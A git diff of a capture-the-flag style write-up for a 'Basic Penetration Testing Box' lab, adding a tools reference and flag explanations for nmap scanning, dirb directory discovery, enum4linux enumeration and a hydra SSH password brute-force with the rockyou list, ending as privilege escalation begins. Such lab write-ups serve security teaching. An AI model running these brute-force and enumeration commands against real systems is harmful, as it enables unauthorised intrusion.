@@ -1,4 +1,43 @@
 # Basic Penetration Testing Box
+--------------------------------------------------------------------
+
+**TOOLS USED**: nmap, dirbuster, enum4linux, hydra, linpeas, John the Ripper
+
+**nmap**: network exploration tool and security / port scanner<br>
+```
+nmap [Scan Type...] [Options] {target specification}
+```
+Scan Types:<br>
+-Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
+-St TCP Scan (Opens full TCP connection)<br>
+-Su UDP Scan<br>
+
+**dirbuster**: web content scanner
+
+```
+dirb <url_base> <url_base> [<wordlist_file(s)>] [options]
+```
+
+**enum4linux**: tool for enumerating information from Windows and Samba systems
+
+**hydra**: network logon cracker
+
+```
+hydra
+       [[[-l LOGIN|-L FILE] [-p PASS|-P FILE|-x OPT -y]] | [-C FILE]]
+       [-e nsr] [-u] [-f|-F] [-M FILE] [-o FILE] [-b FORMAT]
+       [-t TASKS] [-T TASKS] [-w TIME] [-W TIME] [-m OPTIONS] [-s PORT]
+       [-c TIME] [-S] [-O] [-4|6] [-I] [-vV] [-d]
+       server service [OPTIONS]
+```
+
+**linpeas**: script that searches for possible paths to escalate privileges on Linux/Unix*/MacOS hosts
+
+**john**: tool to crack weak passwords
+
+```
+john [options] password-files
+```
 
 --------------------------------------------------------------------
 ## GIVEN INFO
@@ -14,27 +53,32 @@
 ### 1. FIND EXPOSED SERVICES
 
 
-**TOOLS**: NMap
+**TOOLS**: nmap
 
 ```
 nmap -sC -sV -oN nmap.txt 10.10.19.208
 ```
+-sC: script scan with default scripts<br>
+-sV: probe open ports to determine service/version info<br>
+-oN: output scan in normal to given filename<br>
+
 
 ![nmap](./nmap.png)
 
-**EXPOSED PORT (SERVICE)**:
-  22 (ssh),
-  80 (http),
-  139 (smbd),
-  445 (smbd),
-  8009 (ajp13),
-  8080 (http)
+
+**EXPOSED PORT (SERVICE)**:<br>
+  22 (ssh),<br>
+  80 (http),<br>
+  139 (smbd),<br>
+  445 (smbd),<br>
+  8009 (ajp13),<br>
+  8080 (http)<br>
 
 ----------------------------------
 ## 2. FIND HIDDEN DIR ON WEB SERVER
 
 
-**TOOLS**: DirBuster
+**TOOLS**: dirbuster
 
 ```
 dirb http://10.10.19.208
@@ -48,13 +92,15 @@ dirb http://10.10.19.208
 ## 3. GET USERNAME & PASSWORD
 
 
-**TOOLS**: Enum4Linux, Hydra
+**TOOLS**: enum4linux, hydra
 
 **NOTE**: J has a weak password
 
 ```
 enum4linux -a 10.10.19.208 | tee enum4linux.log
 ```
+
+-a: do all simple enumerations
 
 ![enum4linux](./enum4linux.png)
 
@@ -64,6 +110,9 @@ enum4linux -a 10.10.19.208 | tee enum4linux.log
 hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.19.208
 ```
 
+-l: login name<br>
+-P: password file to iterate through
+
 ![hydra](./hydra.png)
 
 **PASSWORD**: armando
@@ -72,7 +121,7 @@ hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.19.208
 ## 4. FIND PRIVILEGE ESCALATION VECTORS
 
 
-**TOOLS**: LinPeas, JohnTheRipper
+**TOOLS**: linpeas, John the Ripper
 
 Host Machine
 ```
